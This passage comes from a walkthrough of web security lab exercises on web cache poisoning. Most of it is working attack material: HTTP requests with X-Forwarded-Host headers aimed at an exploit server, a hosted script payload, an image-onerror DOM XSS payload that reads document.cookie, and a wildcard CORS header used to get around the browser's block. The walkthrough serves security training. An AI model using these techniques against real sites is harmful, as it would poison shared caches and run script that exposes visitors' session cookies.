	<title>Internal cache poisoning</title>
</head>
<body>
	<script type="text/javascript" src="//test.net/resources/js/analytics.js"></script>
	<script src=//test.net/js/geolocate.js?callback=loadCountry>
```


> [!NOTE]
> If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response.
> However, most of the time, you will see that the URL for the canonical link element and the `analytics.js` import now both point to your exploit server, but the `geolocate.js` import URL remains the same.
> For me it worked first time but if it doesn't keep sending the request. 
> Eventually, the URL for the `geolocate.js` resource will also be overwritten with your exploit server URL. 
> This indicates that this fragment is being cached separately by the internal cache. 

Example with only 2 matches:
```html
	<link rel="canonical" href='//test.net/'/>
	<title>Internal cache poisoning</title>
</head>
<body>
	<script type="text/javascript" src="//test.net/resources/js/analytics.js"></script>
	<script src=//my.web-security-academy.net/js/geolocate.js?callback=loadCountry></script>
```
   
   Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is **unkeyed** by the internal cache.
   
4. Remove the `X-Forwarded-Host` header and resend the request. 
   Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. 
   Trick here is to send the request without the header while the fragment is still cached. (from 3 match you should go down to just one match)
   
   This indicates that the header is unkeyed by the internal cache but keyed by the external one. 
   Therefore, you can poison the internally cached fragment using this header.
   
5. Go to the exploit server and create a file at `/js/geolocate.js` containing the payload `alert(document.cookie)`. 
   Store the exploit.
   
6. Change the `X-Forwarded-Host` to point to exploit server
```http
-
X-Forwarded-Host: exploit-my.exploit-server.net
```

7. Remove the CB from the URL and send again and again until you get 4 matches for exploit server URL in the response. (one extra is lab link)

```html
	<link rel="canonical" href='//exploit-my.exploit-server.net/?cb=2'/>
	<title>Internal cache poisoning</title>
</head>
<body>
	<script type="text/javascript" src="//exploit-my.exploit-server.net/resources/js/analytics.js"></script>
	<script src=//exploit-my.exploit-server.net/js/geolocate.js?callback=loadCountry></script><script>trackingID='FxPeT0dDY6vIdi1Y'</script>

<!-- Lab link to exploit server - not important for us now -->
	<h2>Internal cache poisoning</h2>
	<a id='exploit-link' class='button' target='_blank' href='https://exploit-0a8200f103bf64df80851b6c01040007.exploit-server.net'>Go to exploit server</a>
```
   
This solves the lab.

## Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

![Awesome Badges](https://img.shields.io/badge/level-expert-blueviolet)

This lab contains a DOM-based vulnerability that can be exploited as part of a web cache poisoning attack. 

A user visits the home page roughly once a minute. 
Note that the cache used by this lab has stricter criteria for deciding which responses are cacheable, so you will need to study the cache behavior closely.

To solve the lab, poison the cache with a response that executes `alert(document.cookie)` in the visitor's browser.

#### Solution

This lab has 3 parts:
- Cache Poisoning
- DOM XSS
- Relaxation of CORS specifications with wildcards

##### Cache Poisoning

Navigate to Home Page then check headers with Param Miner to find
- `X-Forwarded-Host`

Send the Request:
```http
GET /?cb=whitedandelion HTTP/2
Host: my.web-security-academy.net
...
X-Forwarded-Host: omnissiah.com


```

And notice in Response:
```html
<script>
	data = {"host":"omnissiah.com","path":"/"}
</script>

...

<script>
	initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
</script>
```

Check the Response for `GET /resources/json/geolocate.json HTTP/2` in HTTP History and notice it returns:

```json
{
    "country": "United Kingdom"
}
```

That reflects on home page as:
```
Free shipping to United Kingdom
```
```html
<div id="shipping-info" class="shipping-info">
	<img src="/resources/images/localShipping.svg">
	<div>Free shipping to United Kingdom</div>
</div>
```


Similarly to previous labs we will change this to point to our Exploit Server.

In Exploit Serve set File as: `/resources/json/geolocate.json`
In Exploit Serve set Body:

```json
{
	"country":"Omnissiah protects!"
}
```

Store the changes.

Now poison the cache with Request

```http
GET /?cb=whitedandelion HTTP/2
Host: my.web-security-academy.net
...
X-Forwarded-Host: exploit-my.exploit-server.net


```

And open in Browser.
Should work but it doesn't.

Check the console and notice:

```
Access to fetch at 'https://exploit-my.exploit-server.net/resources/json/geolocate.json' from origin 'https://my.web-security-academy.net' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
```

##### Relaxation of CORS specifications with wildcards

In Exploit Server set ACAO to `*` in Head section:

```http
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *
```

Store the changes.

Remember cache resets after 30 secons so might need to wait a bit.

Open response in browser and notice:

```
Free shipping to Omnissiah protects!
```

```html
<div id="shipping-info" class="shipping-info">
	<img src="/resources/images/localShipping.svg">
	<div>Free shipping to Omnissiah protects!</div>
</div>
```

##### DOM XSS

First tried with this but it didn't trigger.
```json
{
    "country":"</div><script>alert(document.cookie)</script><div>Warp"
}
```

Then tried with `img` tag and this worked.
```json
{
    "country":"<img src=1 onerror=alert(document.cookie) />Warp"
}
```

Remember to resend the modified request to Home to re-poison the cache.

Now remove cache buster and send again:

```http
GET / HTTP/2
Host: my.web-security-academy.net
...
X-Forwarded-Host: exploit-my.exploit-server.net


```

Remember admin checks the page every minute or so. But the cache expires every 30 seconds.
Re-poison the cache until the lab is solved.


##### What's different on this lab from other?
It has a Free Delivery (toLocation) on the top left corner.